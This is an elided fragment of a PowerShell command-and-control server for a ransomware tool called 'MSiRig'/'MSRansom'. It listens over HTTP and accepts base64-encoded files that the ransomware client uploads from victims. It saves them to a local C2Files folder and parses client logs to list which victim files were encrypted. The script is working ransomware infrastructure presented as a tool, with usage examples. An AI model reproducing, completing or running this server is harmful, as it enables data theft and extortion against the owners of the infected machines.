...
$Host.UI.RawUI.WindowTitle = "C2Server - MSiRig Ransomware" 
}
...
function Show-Banner {
   ...
   Write-Host "  / ___|___ \/ ___|  ___ _ ____   _____ _ __  " -ForegroundColor Cyan
   Write-Host " | |     __) \___ \ / _ \ '__\ \ / / _ \ '__| " -ForegroundColor Cyan
   Write-Host " | |___ / __/ ___) |  __/ |   \ V /  __/ |    " -ForegroundColor Cyan
   Write-Host "  \____|_____|____/ \___|_|    \_/ \___|_|    " -ForegroundColor Cyan
   Write-Host                                                
   Write-Host "  --------------- for MSRansom --------------  " -ForegroundColor Green }

# Help
function Show-Help {
   Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you to recieve data from"
   Write-Host "        MSRansom client through HTTP protocol"
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\C2Server.ps1 LocalHost LocalPort" -ForegroundColor DarkCyan 
   Write-Host "          Example: .\C2Server localhost 443" -ForegroundColor Green
   Write-Host "          Example: .\C2Server * 80" -ForegroundColor Green
...
Write-Host "[+] Listening to new connection on $whost`:$wport" -f DarkCyan
...
if ($context.Request.HttpMethod -eq "POST") {
   ...
   if ($context.Request.RawUrl -like "/files/*") { 
      ...
      if ($B64Name -eq "none.null") { Write-Host "[!] No files have been received!" -f Red } else { 
        
      if ($OSVersion -like "*Win*") { $C2Rfile = "$pwd\C2Files\$B64Name" } else { $C2Rfile = "$pwd/C2Files/$B64Name" } 
         $C2RName = $C2Rfile.replace(".msirig","") ; Write-Host "[+] $C2RName file received" -f DarkCyan ; $B64file = R64Decoder -f $FormContent
   ...
   if ($context.Request.RawUrl -eq "/logs") { 
      Write-Host ; Write-Host "[i] Getting encrypted files list.." -f Green
      $B64Logs = R64Decoder -t $FormContent
      $Logs = $B64Logs -split "`n" | Where-Object { $_ -match "\[\!\] .* is now encrypted" }
      if ($Logs) {
          Write-Host "Encrypted files:" -f Yellow
          $Logs | ForEach-Object { Write-Host $_ -f Red }
      } else {
          Write-Host "[!] No encrypted files found." -f Red }
   }
